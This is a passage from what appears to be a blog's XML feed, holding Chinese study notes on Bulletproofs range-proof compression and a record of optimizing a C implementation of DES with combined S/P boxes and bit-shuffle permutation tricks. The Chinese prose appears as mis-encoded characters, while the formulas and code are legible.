c=\langle\textbf{a},\textbf{b}\rangle\}</script><p><img src= "/img/loading.gif" data-src="/2021/10/31/Bullet-Proofs/image-20211103202149106.png" alt></p><p>ç­‰ä»·äºè¯æ˜ï¼š</p><script type="math/tex; mode=display">\{(\textbf{G},\textbf{H}\in\mathbb{G}^n,u,P\in\mathbb{G};\ \textbf{a},\textbf{b}\in\mathbb{Z}^{n}_{p}):\ P=\textbf{aG}+\textbf{bH}+\langle\textbf{a},\textbf{b}\rangle u\}</script><p>å¼•å…¥ä¸­é—´å˜é‡$x\in\mathbb{Z}_{p}^{\times}$ï¼Œè®°$nâ€™=n/2$ï¼Œå¯¹åŸå§‹çš„$\textbf{a},\textbf{b},\textbf{G},\textbf{H}$ä½œä»¥ä¸‹å˜æ¢ï¼š</p><script type="math/tex; mode=display">\textbf{a}'=x\textbf{a}_{[:n']}+x^{-1}\textbf{a}_{[n':]}\in\mathbb{Z}_p^{n'}\\\textbf{b}'=x^{-1}\textbf{b}_{[:n']}+x\textbf{b}_{[n':]}\in\mathbb{Z}_p^{n'}\\\textbf{G}'=x^{-1}\textbf{G}_{[:n']}+x\textbf{G}_{[n':]}\in\mathbb{G}^{n'}\\\textbf{H}'=x\textbf{H}_{[:n']}+x^{-1}\textbf{H}_{[n':]}\in\mathbb{G}^{n'}\\</script><p>ä»¤$Pâ€™=\langle\textbf{a}â€™,\textbf{G}â€™\rangle+\langle\textbf{b}â€™,\textbf{H}â€™\rangle+\langle\textbf{a}â€™,\textbf{b}â€™\rangle u$</p><p><img src= "/img/loading.gif" data-src="/2021/10/31/Bullet-Proofs/image-20211103215000179.png" alt></p><p>å½“$P=\textbf{aG}+\textbf{bH}+\langle\textbf{a},\textbf{b}\rangle u$æˆç«‹æ—¶ï¼Œä¸Šè¿°æ¨å¯¼æˆç«‹ï¼Œå³$Pâ€™=P+x^2L+x^{-2}R$</p><p>æ­¤æ—¶ä¼ è¾“çš„$\textbf{a},\textbf{b}$å°±è½¬ä¸ºäº†$\textbf{a}â€™,\textbf{b}â€™$ï¼ˆå¸¦å®½/2ï¼‰</p><p>å› æ­¤æˆ‘ä»¬å¯ä»¥é€’å½’å‹ç¼©$P$ï¼ˆè®°ä½œ$P^{(0)}$ï¼‰ï¼Œå¾—åˆ°</p><p>$P^{(k)}=\langle\textbf{a}^{(k)},\textbf{G}^{(k)}\rangle+\langle\textbf{b}^{(k)},\textbf{H}^{(k)}\rangle+\langle\textbf{a}^{(k)},\textbf{b}^{(k)}\rangle u$</p><p>$P^{(k)}=P^{(0)}+\sum_{i=1}^{k}(x^2L^{(i-1)}+x^{-2}R^{(i-1)})$</p><p>æ­¤æ—¶<em>Verifier</em>åªéœ€éªŒè¯</p><script type="math/tex; mode=display">P^{(0)}\stackrel{?}{=}\langle\textbf{a}^{(k)},\textbf{G}^{(k)}\rangle+\langle\textbf{b}^{(k)},\textbf{H}^{(k)}\rangle+\langle\textbf{a}^{(k)},\textbf{b}^{(k)}\rangle u-\sum_{i=1}^{k}(x^2L^{(i-1)}+x^{-2}R^{(i-1)})</script><p>å³å¯</p><p><em>Proofer</em>éœ€è¦å‘é€$(\textbf{a}^{(k)},\textbf{b}^{(k)})$ä»¥åŠ$k$è½®çš„$(L,R)$ï¼Œæ¶ˆè€—å¸¦å®½ä»$2n$é™åˆ°äº†$2logn+2$.</p><p>å°†å‰æ–‡çš„<strong>æ ¡éªŒâ‘¡â‘¢</strong>æ”¹ç”¨è¿™ç§æ–¹æ³•ï¼Œæ¥å®ç°å¯¹æ•°çº§çš„å‹ç¼©ã€‚</p><h4 id="Aggregating-Logarithmic-Proofs"><a href="#Aggregating-Logarithmic-Proofs" class="headerlink" title="Aggregating Logarithmic Proofs"></a>Aggregating Logarithmic Proofs</h4><p><img src= "/img/loading.gif" data-src="/2021/10/31/Bullet-Proofs/image-20211104201755929.png" alt></p><p>çº¢æ¡†ä¸­ä¸º$\sum_{j=1}^{m}(z^{1+j})$ï¼Œè€Œé$\sum z^2$ï¼Œæ˜¯å› ä¸ºä¸‹é¢åŸæœ‰å¼å­ä¸­çš„$z^{2}$ï¼Œåœ¨$m$ä¸ªindividual range proofsæ•´åˆæ—¶ï¼Œé‡‡ç”¨ä¸åŒçš„å¹‚æ¬¡$z^{3},z^{4},â€¦$ï¼ˆä»ç„¶æˆç«‹ï¼‰</p><p><img src= "/img/loading.gif" data-src="/2021/10/31/Bullet-Proofs/image-20211104202958100.png" alt></p><p>è¿›ä¸€æ­¥çš„ï¼Œå®šä¹‰æ–°çš„ $\tilde{t}=\tilde{t_1}\cdot x+\tilde{t_2}\cdot x^2+\sum_{j=1}^{m}z^{1+j}\cdot\tilde{v_j}$ ï¼ˆå…¶ä¸­$\tilde{v_j}$ä¸ºå¯¹åº”$v_j$çš„ç›²åŒ–å› å­ï¼Œ$j=1,â€¦,m$ï¼‰</p><p>$\delta(y,z)=(z-z^2)\langle\textbf{1}^{n\cdot m},\textbf{y}^{n\cdot m}\rangle-\sum_{j=1}^{m}z^{j+2}\langle\textbf{1}^{n},\textbf{2}^{n}\rangle$</p><p>å‰æ–‡çš„æ ¡éªŒâ‘ æ”¹å†™ä¸ºï¼š</p><script type="math/tex; mode=display">\textbf{t}B+\tilde{t}\tilde{B}\stackrel{?}{=}z^{2}\langle\textbf{z}^{m},\textbf{V}\rangle+\delta(y,z)B+T_1\cdot x+T_2\cdot x^2\\,å…¶ä¸­\ \textbf{V}=(V_1,V_2,...,V_m)\in\mathbb{G}^{m},\textbf{z}^{m}=(1,z,z^2,...,z^{m-1})\in\mathbb{Z}_{p}^{m}</script><p>æ ¡éªŒâ‘¡çš„<strong>å·¦ä¾§</strong>æ”¹å†™ä¸ºï¼š</p><script type="math/tex; mode=display">A+S\cdot x-z\langle\textbf{1}^{n\cdot m},\textbf{G}\rangle+\langle z\textbf{y}^{n\cdot m}+\sum_{j=1}^{m}z^{1+j}\cdot(\textbf{0}^{(j-1)n}\|\textbf{2}^n\|\textbf{0}^{(m-j)n},\textbf{H'}\rangle-\tilde{e}\tilde{B}</script><p><img src= "/img/loading.gif" data-src="/2021/10/31/Bullet-Proofs/image-20211104222111097.png" alt></p><h4 id="Non-Interactive-Proof-through-Fiat-Shamir"><a href="#Non-Interactive-Proof-through-Fiat-Shamir" class="headerlink" title="Non-Interactive Proof through Fiat-Shamir"></a>Non-Interactive Proof through Fiat-Shamir</h4><p><img src= "/img/loading.gif" data-src="/2021/10/31/Bullet-Proofs/image-20211104222420877.png" alt></p><p>Fiat-Shamirç›´è§‚è¡¨ç¤ºå¯çœ‹çŸ¥ä¹å›ç­”<a href="https://zhuanlan.zhihu.com/p/95921725" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/95921725</a></p><h3 id="TODO"><a href="#TODO" class="headerlink" title="TODO"></a>TODO</h3>]]></content>
      
      
      <categories>
          
          <category> Blockchain </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Engineering Practice of Cryptosystem</title>
      <link href="/2021/10/28/Engineering-Practice-of-Cryptosystem/"/>
      <url>/2021/10/28/Engineering-Practice-of-Cryptosystem/</url>
      
        <content type="html"><![CDATA[<h4 id="Assignment"><a href="#Assignment" class="headerlink" title="Assignment"></a>Assignment</h4><p>ç•¥</p><h4 id="Record"><a href="#Record" class="headerlink" title="Record"></a>Record</h4><p>å®ç°DESçš„æ—¶å€™å‘ç°æ€§èƒ½ä¸€ç›´æä¸ä¸Šå»ï¼ˆv1æµ‹è¯•åâ‰ˆ750us/KBï¼Œè·ç¦»è¦æ±‚çš„500Mbpsè¿˜æœ‰äº¿ç‚¹ç‚¹è·ç¦»â€¦ğŸ¤¦â€ï¼‰</p><p>åœ¨æ­¤è®°å½•å°è¯•æå‡æ€§èƒ½è¿‡ç¨‹ä¸­æ›´è¿­çš„å‡ ä¸ªç‰ˆæœ¬</p><h5 id="Combine-S-and-P-boxes"><a href="#Combine-S-and-P-boxes" class="headerlink" title="Combine S and P boxes"></a><em>Combine S and P boxes</em></h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">uint32_t</span> spbox[<span class="number">8</span>][<span class="number">64</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">gen_spbox</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">64</span>; j++) &#123;</span><br><span class="line">            spbox[i][j] = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">int</span> real_j = ((((j &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0x02</span>) | (j &amp; <span class="number">0x01</span>)) &lt;&lt; <span class="number">4</span>) | ((j &gt;&gt; <span class="number">1</span>) &amp; <span class="number">0x0f</span>);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> k = <span class="number">0</span>; k &lt; <span class="number">4</span>; k++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (sbox[i][real_j] &amp; (<span class="number">0x08</span> &gt;&gt; k)) &#123;</span><br><span class="line">                    spbox[i][j] |= <span class="number">1</span> &lt;&lt; (<span class="number">32</span> - inv_pbox[<span class="number">4</span> * i + k]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"><span class="comment">//#ifdef DEBUG</span></span><br><span class="line"><span class="comment">//            printf("spbox[%d][%2d]=%08x\n", i, j, spbox[i][j]);</span></span><br><span class="line"><span class="comment">//#endif</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="Construct-fewer-Bit-Operations"><a href="#Construct-fewer-Bit-Operations" class="headerlink" title="Construct fewer Bit Operations"></a><em>Construct fewer Bit Operations</em></h5><p>å¼€é”€ä¸»è¦åœ¨äºBIT_TO_BYTEå’ŒBYTE_TO_BIT ğŸ‘‰ IPï¼ŒPC-1ï¼ŒPC-2ç­‰ç½®æ¢å‡æ˜¯åŸºäºbitæ•°ç»„ä¸Šåšçš„å¤„ç†</p><p>å› æ­¤å‚è€ƒmbed TLSï¼Œæ‘’å¼ƒbitæ•°ç»„ï¼Œæ„é€ æ›´å°‘æ­¥éª¤çš„ä½è¿ç®—æ¥æå‡æ€§èƒ½</p><ul><li><p>Initial Permutation (IP)</p><p>mbed TLSç”¨åˆ°ä¸€ä¸ªå°trickï¼š</p><p><img src= "/img/loading.gif" data-src="/2021/10/28/Engineering-Practice-of-Cryptosystem/image-20211028203914919.png" alt></p><p>å¯ä»¥è¾¾åˆ°ç±»ä¼¼shuffleçš„ç›®çš„ï¼Œæˆ‘ä»¬å†å›è¿‡å¤´æ¥çœ‹IPï¼š</p><p><img src= "/img/loading.gif" data-src="/2021/10/28/Engineering-Practice-of-Cryptosystem/image-20211028204203451.png" alt></p><p><strong>é€†æ¨</strong>å›åˆå§‹çš„X = [1 2 â€¦ 32], Y = [33 34 â€¦ 64]çŠ¶æ€ï¼ˆæ‰¾å¦‚ä½•shuffleèƒ½å¾—åˆ°<strong>è¿ç»­åºåˆ—</strong>ï¼‰</p><p>é€†æ¨è¿‡ç¨‹çš„é€»è¾‘å¾ˆæ¸…æ™°ï¼Œä½†ä¸åœ¨æ­¤ç‰¹æ„ç”»å‡ºï¼Œä¸‹é¢æ˜¯æ­£å‘çš„å˜æ¢é€»è¾‘ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">X = </span><br><span class="line"> <span class="number">1</span>  <span class="number">2</span>  <span class="number">3</span>  <span class="number">4</span>  <span class="number">5</span>  <span class="number">6</span>  <span class="number">7</span>  <span class="number">8</span>  <span class="number">9</span> <span class="number">10</span> <span class="number">11</span> <span class="number">12</span> <span class="number">13</span> <span class="number">14</span> <span class="number">15</span> <span class="number">16</span> <span class="number">17</span> <span class="number">18</span> <span class="number">19</span> <span class="number">20</span> <span class="number">21</span> <span class="number">22</span> <span class="number">23</span> <span class="number">24</span> <span class="number">25</span> <span class="number">26</span> <span class="number">27</span> <span class="number">28</span> <span class="number">29</span> <span class="number">30</span> <span class="number">31</span> <span class="number">32</span></span><br><span class="line">Y = </span><br><span class="line"><span class="number">33</span> <span class="number">34</span> <span class="number">35</span> <span class="number">36</span> <span class="number">37</span> <span class="number">38</span> <span class="number">39</span> <span class="number">40</span> <span class="number">41</span> <span class="number">42</span> <span class="number">43</span> <span class="number">44</span> <span class="number">45</span> <span class="number">46</span> <span class="number">47</span> <span class="number">48</span> <span class="number">49</span> <span class="number">50</span> <span class="number">51</span> <span class="number">52</span> <span class="number">53</span> <span class="number">54</span> <span class="number">55</span> <span class="number">56</span> <span class="number">57</span> <span class="number">58</span> <span class="number">59</span> <span class="number">60</span> <span class="number">61</span> <span class="number">62</span> <span class="number">63</span> <span class="number">64</span></span><br><span class="line">-----------------------------------------</span><br><span class="line">T = ((X &gt;&gt; <span class="number">4</span>) ^ Y) &amp; <span class="number">0x0f0f0f0f</span></span><br><span class="line">Y ^= T  </span><br><span class="line">X ^= (T &lt;&lt; <span class="number">4</span>)</span><br><span class="line">-----------------------------------------</span><br><span class="line">Y = </span><br><span class="line"><span class="number">33</span> <span class="number">34</span> <span class="number">35</span> <span class="number">36</span>  <span class="number">1</span>  <span class="number">2</span>  <span class="number">3</span>  <span class="number">4</span> <span class="number">41</span> <span class="number">42</span> <span class="number">43</span> <span class="number">44</span>  <span class="number">9</span> <span class="number">10</span> <span class="number">11</span> <span class="number">12</span> <span class="number">49</span> <span class="number">50</span> <span class="number">51</span> <span class="number">52</span> <span class="number">17</span> <span class="number">18</span> <span class="number">19</span> <span class="number">20</span> <span class="number">57</span> <span class="number">58</span> <span class="number">59</span> <span class="number">60</span> <span class="number">25</span> <span class="number">26</span> <span class="number">27</span> <span class="number">28</span></span><br><span class="line">X = </span><br><span class="line"><span class="number">37</span> <span class="number">38</span> <span class="number">39</span> <span class="number">40</span>  <span class="number">5</span>  <span class="number">6</span>  <span class="number">7</span>  <span class="number">8</span> <span class="number">45</span> <span class="number">46</span> <span class="number">47</span> <span class="number">48</span> <span class="number">13</span> <span class="number">14</span> <span class="number">15</span> <span class="number">16</span> <span class="number">53</span> <span class="number">54</span> <span class="number">55</span> <span class="number">56</span> <span class="number">21</span> <span class="number">22</span> <span class="number">23</span> <span class="number">24</span> <span class="number">61</span> <span class="number">62</span> <span class="number">63</span> <span class="number">64</span> <span class="number">29</span> <span class="number">30</span> <span class="number">31</span> <span class="number">32</span></span><br><span class="line">-----------------------------------------</span><br><span class="line">T = ((X &gt;&gt; <span class="number">16</span>) ^ Y) &amp; <span class="number">0x0000ffff</span></span><br><span class="line">Y ^= T</span><br><span class="line">X ^= (T &lt;&lt; <span class="number">16</span>)</span><br><span class="line">-----------------------------------------</span><br><span class="line">Y = </span><br><span class="line"><span class="number">33</span> <span class="number">34</span> <span class="number">35</span> <span class="number">36</span>  <span class="number">1</span>  <span class="number">2</span>  <span class="number">3</span>  <span class="number">4</span> <span class="number">41</span> <span class="number">42</span> <span class="number">43</span> <span class="number">44</span>  <span class="number">9</span> <span class="number">10</span> <span class="number">11</span> <span class="number">12</span> <span class="number">37</span> <span class="number">38</span> <span class="number">39</span> <span class="number">40</span>  <span class="number">5</span>  <span class="number">6</span>  <span class="number">7</span>  <span class="number">8</span> <span class="number">45</span> <span class="number">46</span> <span class="number">47</span> <span class="number">48</span> <span class="number">13</span> <span class="number">14</span> <span class="number">15</span> <span class="number">16</span></span><br><span class="line">X = </span><br><span class="line"><span class="number">49</span> <span class="number">50</span> <span class="number">51</span> <span class="number">52</span> <span class="number">17</span> <span class="number">18</span> <span class="number">19</span> <span class="number">20</span> <span class="number">57</span> <span class="number">58</span> <span class="number">59</span> <span class="number">60</span> <span class="number">25</span> <span class="number">26</span> <span class="number">27</span> <span class="number">28</span> <span class="number">53</span> <span class="number">54</span> <span class="number">55</span> <span class="number">56</span> <span class="number">21</span> <span class="number">22</span> <span class="number">23</span> <span class="number">24</span> <span class="number">61</span> <span class="number">62</span> <span class="number">63</span> <span class="number">64</span> <span class="number">29</span> <span class="number">30</span> <span class="number">31</span> <span class="number">32</span></span><br><span class="line">-----------------------------------------</span><br><span class="line">T = ((Y &gt;&gt; <span class="number">2</span>) ^ X) &amp; <span class="number">0x33333333</span></span><br><span class="line">X ^= T</span><br><span class="line">Y ^= (T &lt;&lt; <span class="number">2</span>)</span><br><span class="line">-----------------------------------------</span><br><span class="line">X = </span><br><span class="line"><span class="number">49</span> <span class="number">50</span> <span class="number">33</span> <span class="number">34</span> <span class="number">17</span> <span class="number">18</span>  <span class="number">1</span>  <span class="number">2</span> <span class="number">57</span> <span class="number">58</span> <span class="number">41</span> <span class="number">42</span> <span class="number">25</span> <span class="number">26</span>  <span class="number">9</span> <span class="number">10</span> <span class="number">53</span> <span class="number">54</span> <span class="number">37</span> <span class="number">38</span> <span class="number">21</span> <span class="number">22</span>  <span class="number">5</span>  <span class="number">6</span> <span class="number">61</span> <span class="number">62</span> <span class="number">45</span> <span class="number">46</span> <span class="number">29</span> <span class="number">30</span> <span class="number">13</span> <span class="number">14</span></span><br><span class="line">Y = </span><br><span class="line"><span class="number">51</span> <span class="number">52</span> <span class="number">35</span> <span class="number">36</span> <span class="number">19</span> <span class="number">20</span>  <span class="number">3</span>  <span class="number">4</span> <span class="number">59</span> <span class="number">60</span> <span class="number">43</span> <span class="number">44</span> <span class="number">27</span> <span class="number">28</span> <span class="number">11</span> <span class="number">12</span> <span class="number">55</span> <span class="number">56</span> <span class="number">39</span> <span class="number">40</span> <span class="number">23</span> <span class="number">24</span>  <span class="number">7</span>  <span class="number">8</span> <span class="number">63</span> <span class="number">64</span> <span class="number">47</span> <span class="number">48</span> <span class="number">31</span> <span class="number">32</span> <span class="number">15</span> <span class="number">16</span></span><br><span class="line">-----------------------------------------</span><br><span class="line">T = ((Y &gt;&gt; <span class="number">8</span>) ^ X) &amp; <span class="number">0x00ff00ff</span></span><br><span class="line">X ^= T</span><br><span class="line">Y ^= (T &lt;&lt; <span class="number">8</span>)</span><br><span class="line">-----------------------------------------</span><br><span class="line">X = </span><br><span class="line"><span class="number">49</span> <span class="number">50</span> <span class="number">33</span> <span class="number">34</span> <span class="number">17</span> <span class="number">18</span>  <span class="number">1</span>  <span class="number">2</span> <span class="number">51</span> <span class="number">52</span> <span class="number">35</span> <span class="number">36</span> <span class="number">19</span> <span class="number">20</span>  <span class="number">3</span>  <span class="number">4</span> <span class="number">53</span> <span class="number">54</span> <span class="number">37</span> <span class="number">38</span> <span class="number">21</span> <span class="number">22</span>  <span class="number">5</span>  <span class="number">6</span> <span class="number">55</span> <span class="number">56</span> <span class="number">39</span> <span class="number">40</span> <span class="number">23</span> <span class="number">24</span>  <span class="number">7</span>  <span class="number">8</span></span><br><span class="line">Y = </span><br><span class="line"><span class="number">57</span> <span class="number">58</span> <span class="number">41</span> <span class="number">42</span> <span class="number">25</span> <span class="number">26</span>  <span class="number">9</span> <span class="number">10</span> <span class="number">59</span> <span class="number">60</span> <span class="number">43</span> <span class="number">44</span> <span class="number">27</span> <span class="number">28</span> <span class="number">11</span> <span class="number">12</span> <span class="number">61</span> <span class="number">62</span> <span class="number">45</span> <span class="number">46</span> <span class="number">29</span> <span class="number">30</span> <span class="number">13</span> <span class="number">14</span> <span class="number">63</span> <span class="number">64</span> <span class="number">47</span> <span class="number">48</span> <span class="number">31</span> <span class="number">32</span> <span class="number">15</span> <span class="number">16</span></span><br><span class="line">-----------------------------------------</span><br><span class="line">Y = ((Y &lt;&lt; <span class="number">1</span>) &amp; <span class="number">0xffffffff</span>) | (Y &gt;&gt; <span class="number">31</span>)</span><br><span class="line">-----------------------------------------</span><br><span class="line">X = </span><br><span class="line"><span class="number">49</span> <span class="number">50</span> <span class="number">33</span> <span class="number">34</span> <span class="number">17</span> <span class="number">18</span>  <span class="number">1</span>  <span class="number">2</span> <span class="number">51</span> <span class="number">52</span> <span class="number">35</span> <span class="number">36</span> <span class="number">19</span> <span class="number">20</span>  <span class="number">3</span>  <span class="number">4</span> <span class="number">53</span> <span class="number">54</span> <span class="number">37</span> <span class="number">38</span> <span class="number">21</span> <span class="number">22</span>  <span class="number">5</span>  <span class="number">6</span> <span class="number">55</span> <span class="number">56</span> <span class="number">39</span> <span class="number">40</span> <span class="number">23</span> <span class="number">24</span>  <span class="number">7</span>  <span class="number">8</span></span><br><span class="line">Y = </span><br><span class="line"><span class="number">58</span> <span class="number">41</span> <span class="number">42</span> <span class="number">25</span> <span class="number">26</span>  <span class="number">9</span> <span class="number">10</span> <span class="number">59</span> <span class="number">60</span> <span class="number">43</span> <span class="number">44</span> <span class="number">27</span> <span class="number">28</span> <span class="number">11</span> <span class="number">12</span> <span class="number">61</span> <span class="number">62</span> <span class="number">45</span> <span class="number">46</span> <span class="number">29</span> <span class="number">30</span> <span class="number">13</span> <span class="number">14</span> <span class="number">63</span> <span class="number">64</span> <span class="number">47</span> <span class="number">48</span> <span class="number">31</span> <span class="number">32</span> <span class="number">15</span> <span class="number">16</span> <span class="number">57</span></span><br><span class="line">-----------------------------------------</span><br><span class="line">T = (X ^ Y) &amp; <span class="number">0xaaaaaaaa</span></span><br><span class="line">X ^= T</span><br><span class="line">Y ^= T</span><br><span class="line">-----------------------------------------</span><br><span class="line">X = </span><br><span class="line"><span class="number">58</span> <span class="number">50</span> <span class="number">42</span> <span class="number">34</span> <span class="number">26</span> <span class="number">18</span> <span class="number">10</span>  <span class="number">2</span> <span class="number">60</span> <span class="number">52</span> <span class="number">44</span> <span class="number">36</span> <span class="number">28</span> <span class="number">20</span> <span class="number">12</span>  <span class="number">4</span> <span class="number">62</span> <span class="number">54</span> <span class="number">46</span> <span class="number">38</span> <span class="number">30</span> <span class="number">22</span> <span class="number">14</span>  <span class="number">6</span> <span class="number">64</span> <span class="number">56</span> <span class="number">48</span> <span class="number">40</span> <span class="number">32</span> <span class="number">24</span> <span class="number">16</span>  <span class="number">8</span></span><br><span class="line">Y = </span><br><span class="line"><span class="number">49</span> <span class="number">41</span> <span class="number">33</span> <span class="number">25</span> <span class="number">17</span>  <span class="number">9</span>  <span class="number">1</span> <span class="number">59</span> <span class="number">51</span> <span class="number">43</span> <span class="number">35</span> <span class="number">27</span> <span class="number">19</span> <span class="number">11</span>  <span class="number">3</span> <span class="number">61</span> <span class="number">53</span> <span class="number">45</span> <span class="number">37</span> <span class="number">29</span> <span class="number">21</span> <span class="number">13</span>  <span class="number">5</span> <span class="number">63</span> <span class="number">55</span> <span class="number">47</span> <span class="number">39</span> <span class="number">31</span> <span class="number">23</span> <span class="number">15</span>  <span class="number">7</span> <span class="number">57</span></span><br><span class="line">-----------------------------------------</span><br><span class="line">Y = ((Y &lt;&lt; <span class="number">31</span>) &amp; <span class="number">0xffffffff</span>) | (Y &gt;&gt; <span class="number">1</span>)</span><br><span class="line">-----------------------------------------</span><br><span class="line">X = </span><br><span class="line"><span class="number">58</span> <span class="number">50</span> <span class="number">42</span> <span class="number">34</span> <span class="number">26</span> <span class="number">18</span> <span class="number">10</span>  <span class="number">2</span> <span class="number">60</span> <span class="number">52</span> <span class="number">44</span> <span class="number">36</span> <span class="number">28</span> <span class="number">20</span> <span class="number">12</span>  <span class="number">4</span> <span class="number">62</span> <span class="number">54</span> <span class="number">46</span> <span class="number">38</span> <span class="number">30</span> <span class="number">22</span> <span class="number">14</span>  <span class="number">6</span> <span class="number">64</span> <span class="number">56</span> <span class="number">48</span> <span class="number">40</span> <span class="number">32</span> <span class="number">24</span> <span class="number">16</span>  <span class="number">8</span></span><br><span class="line">Y = </span><br><span class="line"><span class="number">57</span> <span class="number">49</span> <span class="number">41</span> <span class="number">33</span> <span class="number">25</span> <span class="number">17</span>  <span class="number">9</span>  <span class="number">1</span> <span class="number">59</span> <span class="number">51</span> <span class="number">43</span> <span class="number">35</span> <span class="number">27</span> <span class="number">19</span> <span class="number">11</span>  <span class="number">3</span> <span class="number">61</span> <span class="number">53</span> <span class="number">45</span> <span class="number">37</span> <span class="number">29</span> <span class="number">21</span> <span class="number">13</span>  <span class="number">5</span> <span class="number">63</span> <span class="number">55</span> <span class="number">47</span> <span class="number">39</span> <span class="number">31</span> <span class="number">23</span> <span class="number">15</span>  <span class="number">7</span></span><br></pre></td></tr></table></figure></li><li><p>PC-1</p><p><img src= "/img/loading.gif" data-src="/2021/10/28/Engineering-Practice-of-Cryptosystem/image-20211028211906967.png" alt></p><p>æ³¨æ„åˆ°PC-1å­˜åœ¨å¦‚å›¾æ‰€ç¤º æ­¥é•¿ä¸º8 å®¹é‡ä¸º4çš„è¿ç»­åºåˆ—ï¼Œe.g. Leftå¯å°†{33, 34, 35, 36}ä½œä¸ºåŸºå‡†ï¼Œæ‰“è¡¨</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">uint32_t</span> PC1_L[<span class="number">16</span>] = &#123;</span><br><span class="line">        <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000100</span>, <span class="number">0x00000101</span>,</span><br><span class="line">        <span class="number">0x00010000</span>, <span class="number">0x00010001</span>, <span class="number">0x00010100</span>, <span class="number">0x00010101</span>,</span><br><span class="line">        <span class="number">0x01000000</span>, <span class="number">0x01000001</span>, <span class="number">0x01000100</span>, <span class="number">0x01000101</span>,</span><br><span class="line">        <span class="number">0x01010000</span>, <span class="number">0x01010001</span>, <span class="number">0x01010100</span>, <span class="number">0x01010101</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>è¾“å…¥å®¹é‡4çš„è¿ç»­åºåˆ—ï¼ˆå…±$2^4$ç§çŠ¶æ€ï¼‰ï¼Œå°†å…¶å¡«å…¥PC-1å{33, 34, 35, 36}æ‰€åœ¨çš„ä½ç½®ï¼ˆå…¶ä»–ä½ç½®ç½®é›¶ï¼‰ï¼Œæ­¤æ—¶è¾“å‡ºçš„uint32_tå³ä¸ºæ•°ç»„ä¸Šå¯¹åº”ä½ç½®çš„å€¼ï¼ˆè¾“å‡ºå€¼å†æ•´ä½“å·¦ç§»/å³ç§»å³å¯å®ç°PC-1ï¼‰</p><p>Rightåˆ™æ˜¯ä»¥{39, 38, 37, 4}ä¸ºåŸºå‡†ï¼Œä¸åŒçš„æ˜¯éœ€è¦é€†åºè¾“å…¥</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * based on &#123;39, 38, 37, 4&#125;</span></span><br><span class="line"><span class="comment"> * but input in `reverse` order</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">uint32_t</span> PC1_R[<span class="number">16</span>] = &#123;</span><br><span class="line">        <span class="number">0x00000000</span>, <span class="number">0x01000000</span>, <span class="number">0x00010000</span>, <span class="number">0x01010000</span>,</span><br><span class="line">        <span class="number">0x00000100</span>, <span class="number">0x01000100</span>, <span class="number">0x00010100</span>, <span class="number">0x01010100</span>,</span><br><span class="line">        <span class="number">0x00000001</span>, <span class="number">0x01000001</span>, <span class="number">0x00010001</span>, <span class="number">0x01010001</span>,</span><br><span class="line">        <span class="number">0x00000101</span>, <span class="number">0x01000101</span>, <span class="number">0x00010101</span>, <span class="number">0x01010101</span></span><br><span 